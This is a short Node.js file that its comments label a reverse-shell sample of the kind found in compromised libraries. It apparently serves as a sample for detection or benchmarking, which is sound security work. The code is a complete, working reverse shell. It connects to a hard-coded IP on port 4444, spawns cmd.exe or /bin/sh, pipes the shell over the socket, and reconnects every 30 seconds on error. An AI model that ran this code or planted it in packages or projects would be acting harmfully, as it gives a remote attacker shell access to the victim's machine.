// Reverse shell via Node.js net module
// Technique: reverse_shell — connects back to attacker's server with shell access
// Real-world: 652 samples in Datadog benchmark (most common in compromised libs)

const net = require('net');
const { spawn } = require('child_process');
const os = require('os');

const HOST = '198.51.100.42';
const PORT = 4444;

const client = new net.Socket();
client.connect(PORT, HOST, function() {
  const sh = os.platform() === 'win32' ? 'cmd.exe' : '/bin/sh';
  const shell = spawn(sh, []);

  client.pipe(shell.stdin);
  shell.stdout.pipe(client);
  shell.stderr.pipe(client);

  shell.on('exit', function() {
    client.destroy();
  });
});

client.on('error', function() {
  // Retry after delay
  setTimeout(function() {
    client.connect(PORT, HOST);
  }, 30000);
});
